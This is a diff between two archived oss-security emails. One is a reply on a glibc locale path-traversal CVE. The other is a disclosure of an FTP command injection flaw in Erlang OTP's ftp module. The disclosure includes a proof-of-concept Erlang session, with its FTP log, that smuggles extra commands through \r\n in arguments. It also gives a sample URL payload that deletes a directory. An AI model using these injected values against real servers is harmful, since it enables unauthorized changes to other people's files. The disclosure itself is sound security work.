@@ -1,43 +1,107 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/07/12/1
-Message-ID: <20140712155451.GK179@oevtugenva.nrevsny.pk>
-Date: Sat, 12 Jul 2014 11:54:51 -0400
-From: Rich Felker <dalias@...c.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2014-0475: glibc directory traversal in LC_* locale handling
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/29/3
+Message-ID: <CAM4=iJ2tXAuMETRMLqJAyKbzYTY7R3iN_P9o6DxCUCr+HXdDLA@mail.gmail.com>
+Date: Tue, 28 Jan 2014 22:48:41 +0100
+From: Seba <argos83@...il.com>
+To: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: CVE Request: Erlang OTP - ftp module - FTP Command Injection
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Jul 10, 2014 at 08:52:24PM +0200, Florian Weimer wrote:
-> Stephane Chazelas discovered that directory traversal issue in locale
-> handling in glibc.  glibc accepts relative paths with ".." components
-> in the LC_* and LANG variables.  Together with typical OpenSSH
-> configurations (with suitable AcceptEnv settings in sshd_config), this
-> could conceivably be used to bypass ForceCommand restrictions (or
-> restricted shells), assuming the attacker has sufficient level of
-> access to a file system location on the host to create crafted locale
-> definitions there.
-> 
-> Bug report: https://sourceware.org/bugzilla/show_bug.cgi?id=17137
+Hi,
 
-On further review, I question whether this is actually a valid
-vulnerability. The ability to use absolute pathnames as locale strings
-is a documented feature in both POSIX and glibc, and even after the
-patch, absolute pathnames are still accepted for locales in
-non-suid[-like] programs, meaning that bypass of ForceCommand is still
-possible as long as AcceptEnv is accepting LC_*.
+This has been reported to erlang-bugs mailing list:
+http://erlang.org/pipermail/erlang-bugs/2014-January/003998.html
 
-The scope of the actual issue seems to be limited to situations where
-an application was assuming LC_* was safe due to being non-absolute
-(e.g. checking that the initial character is not '/') then getting hit
-by directory traversal due to embedded ".." in the string. This seems
-like a bug, but unless there are applications which were performing
-such naive checks then accepting untrusted LC_* vars, I question
-whether this was really CVE-worthy.
+There is an FTP Command Injection vulnerability in the "ftp" module.
 
-Does this analysis seem correct, or am I missing something? Aside from
-general interest, I'm asking largely because we're in the process of
-discussing how locale path searching should work in musl libc, and I'm
-trying to understand the reasonable expectations for security aspects
-of the locale system from an application and user standpoint.
+All those functions that write any string argument in the control
+socket seem to be vulnerable:
 
-Rich
+user/3
+user/4
+account/2
+cd/2
+ls/2
+nlist/2
+rename/3
+delete/2
+mkdir/2
+rmdir/2
+recv/2
+recv/3
+recv_bin/2,
+recv_chunk_start/2
+send/3
+send_bin/3
+send_chunk_start/2
+append_chunk_start/2
+append/2
+append/3
+append_bin/3
+
+Vulnerability Description
+-------------------------
+
+By injecting a \r\n sequence followed by a new command in a function
+argument you get the ftp module to write the whole string in the
+socket.
+
+E.g. the following erlang shell session:
+
+1> inets:start().
+ok
+2> {ok, Pid} = inets:start(ftpc, [{host, "127.0.0.1"}]).
+{ok,<0.46.0>}
+3> ftp:user(Pid, "anonymous", "password\r\nCWD pub\r\nMKD new_dir").
+ok
+4> ftp:cd(Pid, "/pub\r\nRMD new_dir\r\nPASV").
+ok
+
+
+Generates the following FTP session:
+
+FTP command: Client "127.0.0.1", "USER anonymous"
+FTP response: Client "127.0.0.1", "331 Please specify the password."
+FTP command: Client "127.0.0.1", "PASS <password>"
+FTP response: Client "127.0.0.1", "230 Login successful."
+FTP command: Client "127.0.0.1", "CWD pub"
+FTP response: Client "127.0.0.1", "250 Directory successfully changed."
+FTP command: Client "127.0.0.1", "MKD new_dir"
+FTP response: Client "127.0.0.1", "257 "/pub/new_dir" created"
+FTP command: Client "127.0.0.1", "CWD /pub"
+FTP response: Client "127.0.0.1", "250 Directory successfully changed."
+FTP command: Client "127.0.0.1", "RMD new_dir"
+FTP response: Client "127.0.0.1", "250 Remove directory operation successful."
+FTP command: Client "127.0.0.1", "PASV"
+FTP response: Client "127.0.0.1", "227 Entering Passive Mode
+(127,0,0,1,130,161)."
+
+
+Attack Scenario Example
+-----------------------
+
+A web server allow users to navigate and download documents.
+Internally the web server connects to a private ftp server using OTP
+"ftp" module.
+An attacker might take advantage of the vulnerability to execute
+actions that aren't supposed to be exposed. E.g. delete a directory by
+requesting:
+
+http://www.example.com/list_dir.yaws?dir=/docs/%0d%0aRMD+/docs
+
+Tested on
+---------
+ - Erlang OTP: R15B03
+ - Ubuntu 12.04 x86_64
+ - FTP Sever: vsftpd
+
+
+Mitigation
+----------
+
+Until this is fixed and the proper sanitization is implemented within
+the ftp module, string arguments should get "\r" and "\n" removed
+before being passed to these functions.
+
+
+Sebastián Tello
